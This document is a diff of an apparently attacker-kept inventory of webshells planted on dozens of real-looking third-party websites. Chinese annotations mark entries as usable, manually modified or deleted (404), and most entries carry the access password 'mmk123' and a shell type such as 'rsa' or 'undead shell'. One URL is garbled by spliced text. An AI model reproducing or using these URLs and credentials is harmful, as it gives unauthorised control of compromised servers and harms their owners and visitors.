@@ -1,5 +1,4 @@
 ##已修改可以用的
-
 https://www.trillioncn.net/template/template.php |mmk123 |rsa
 https://zlyxwfhj.cn/template/default/def.php |mmk123 |undead shell
 http://pbvv10077.dgzaixing.com/template/template.php |mmk123 |rsa     手动修改
@@ -14,7 +13,6 @@ http://pbwo741148z.dgzaixing.com/template/template.php |mmk123 |rsa       手动
 http://www.galanzaweixiu.com/template/template.php |mmk123 |rsa         手动修改
 https://www.ywo.net/static/index/fonts/r%20r.php |mmk123 |       手动修改
 https://www.ridvision.com/wuti.php |mmk123 |rsa
-https://pawnnails.com/wuti.php |mmk123 |rsa       手动修改
 https://www.lxbrand.cn/wuti.php |mmk123 |    手动修改
 http://zhiweizhang2018.com/template/template.php |mmk123 |rsa
 http://tuiguangstore.com/wp-content/themes/b2/User/post.php |mmk123 |
@@ -23,38 +21,15 @@ http://www.beonly.com.cn/templets/system/1m.php |mmk123 |rsa
 http://dongshunzn.com/apps/admin/view/default/layui/font/m.php |mmk123 |  
 http://chuangmei.xyz/apps/home/model/site.php |mmk123 |rsa  
 http://jszhiyu.shop/core/basic/form.php |mmk123 |rsa  
-http://www.xjbdyy.top/apps/common/form.php |mmk123 |rsa  
-http://meixuexiaoyuan.com/public/img/form.php |mmk123 |rsa  
 http://nxynkf.shop/apps/home/controller/FormControloler.php |mmk123 |rsa  
 http://zekang.shop/apps/home/controller/DodController.php |mmk123 |rsa  
-http://ruisini.top/apps/api/controller/DodController.php |mmk123 |rsa  
 http://kangzhile.shop/static/upload/image/20240407/...php |mmk123 |rsa  
 http://cikang.shop/static/upload/image/20240531/171.php |mmk123 |rsa 
 http://www.greenwinner.net/Uploads/image/20181011/r%20r.php |mmk123 |  
-https://q3qad.tidotn.com/template/template.php |mmk123 |rsa   忽略证书  
 http://www.xiaoyuanyunwei.cn/template/template.php |mmk123 |rsa 
-https://zlyxwfhj.cn/pc/images/01m.php |mmk123 |  
-http://youthdorm.com/apps/common/version.php |mmk123 |rsa  
-https://xcxygy.com/core/template/01mr1.php |mmk123 |rsa  
-https://wattscontrols.com/apps/api/controller/CmsController.php |mmk123 |  
-http://szkdll.cn/apps/home/controller/CommentController1.php |mmk123 |rsa  
-http://rrrrecycle.com/apps/api/view/default/mr1.php |mmk123 |  
-http://rishunlu.com/m/images/mr1.php |mmk123 |  
-http://nuomi1039.com/core/cache/Builder.php |mmk123 |rsa  
-https://njjhdz.cn/uploads/allimg/200623/01mr1.php |mmk123 |rsa  
-http://nj-bg.cn/template/en/mr1.php |mmk123 |  
-http://jinsoulhouse.com/static/upload/video/m0.php |mmk123 |  
-http://indifa.cn/static/upload/image/20231215/00.php |mmk123 |  
-https://www.hs4g.com/static/images/0mr1jm.php |mmk123 |  
-https://gdptj.com/template/cn/00.php |mmk123 |  
-http://fuyinzong.com/static/upload/image/20231210/00.php |mmk123 |  
-http://acrylicad.com/static/upload/image/20240603/pass.php |Admin001... |大马
-https://acrylicad.com/static/upload/image/20240417/10.php |mmk123 |rsa  
-https://huaihaios.com/template/default/mr1.php |mmk123 |rsa    
 http://kimagex.com/runtime/complile/0r.php |mmk123 |  
 https://www.lgdkj.com/static/upload/image/20200921/01mr1.php |mmk123 |  
 https://tuiguang120.com/upload/file/20240329/01mr2.php |mmk123 |  
-http://tg.zhongshenshidai.com/uploads/ueditor/01mr1.php |mmk123 |  
 http://www.bjdonghua58.com/static/upload/image/20180413/01mr1.php |mmk123 |zq  
 http://www.bjflashdonghua.com/static/upload/video/20230510/01mr1.php |mmk123 |  
 http://www.bj2ddonghua.com/static/upload/image/20230101/01mr1.php |mmk123 |  
@@ -68,17 +43,13 @@ http://kangzhile.shop/template/template.php |mmk123 |rsa
 http://cd-kite.com/template/template.php |mmk123 |rsa  
 http://pbootcms.rangmou.com/template/template.php |mmk123 |rsa  
 http://teng.aike-high.com/template/template.php |mmk123 |rsa  
-http://www.ok5.cn/template/template.php |mmk123 |rsa  
 https://www.lgdkj.com/template/template.php |mmk123 |rsa  
-https://www.zlyxwfhj.cn/template/template.php |mmk123 |rsa  
 https://www.laikal.cn/template/template.php |mmk123 |rsa  
 http://www.bj3ddonghua.com/template/template.php |mmk123 |rsa    
-https://www.jetu.cc/template/template.php |mmk123 |rsa  
 http://www.kaigenoek.com/template/template.php |mmk123 |rsa  
 http://www.yaoshizhidao.com/template/template.php |mmk123 |rsa  
 http://www.shzihang.com/template/template.php |mmk123 |rsa  
 https://www.yunzikang.com/template/template.php |mmk123 |rsa  
-
 
 
 
@@ -174,3 +145,30 @@ https://www.fcshop.vip/pcsite/core/...php |mmk123 |rsa        登陆页面 无�
 https://www.admei.net/Uploads/2021-08-26/1%20.php |mmk123 |rsa     站点403
 http://polyvent.net/apps/api/controller/01mr1.php |mmk123 |rsa     站点打不开
 https://www.scyzk.com/static/upload/image/20220728/mr1.php |mmk123 |     网站证书掉了打不开
+https://pawnnails.com/wuti.php |mmk123 |rsa       站点打不开
+https://zlyxwfhj.cn/pc/images/01m.php |mmk123 |    被删404
+http://nuomi1039.com/core/cache/Builder.php |mmk123 |rsa    被删404
+http://rishunlu.com/m/images/mr1.php |mmk123 |     被删404
+http://rrrrecycle.com/apps/api/view/default/mr1.php |mmk123 |    被删404
+http://szkdll.cn/apps/home/controller/CommentController1.php |mmk123 |rsa   被删404
+https://wattscontrols.com/apps/api/controller/CmsController.php |mmk123 |    被删404
+https://xcxygy.com/core/template/01mr1.php |mmk123 |rsa     被删404
+http://youthdorm.com/apps/common/version.php |mmk123 |rsa    被删404
+https://q3qad.tidotn.com/template/template.php |mmk123 |rsa   忽略证书  到期
+http://ruisini.top/apps/api/controller/DodController.php |mmk123 |rsa   无权修改
+http://meixuexiaoyuan.com/public/img/form.php |mmk123 |rsa  页面404
+http://www.xjbdyy.top/apps/common/form.php |mmk123 |rsa    被删404
+http://tg.zhongshenshidai.com/uploads/ueditor/01mr1.php |mmk123 | 被删404
+https://huaihaios.com/template/default/mr1.php |mmk123 |rsa    无法访问
+http://acrylicad.com/static/upload/image/20240603/pass.php |Admin001... |大马 被删404
+https://acrylicad.com/static/upload/image/20240417/10.php |mmk123 |rsa   被删404
+http://fuyinzong.com/static/upload/image/20231210/00.php |mmk123 |    站点打不开
+https://gdptj.com/template/cn/00.php |mmk123 |   被删404
+https://www.hs4g.com/static/images/0mr1jm.php |mmk123 |    被删404
+http://indifa.cn/static/upload/image/20231215/00.php |mmk123 |   被删404
+http://jinsoulhouse.com/static/upload/video/m0.php |mmk123 |   被删404
+https://njjhdz.cn/uploads/allimg/200623/01mr1.php |mmk123 |rsa  被删404
+http://nj-bg.cn/template/en/mr1.php |mmk123 |   被删404
+http://www.ok5.cn/template/template.php |mmk123 |rsa    被删404
+https://www.jetu.cc/tempwww.ok5.cnlate/template.php |mmk123 |rsa   被删404
+https://www.zlyxwfhj.cn/template/template.php |mmk123 |rsa   被删404
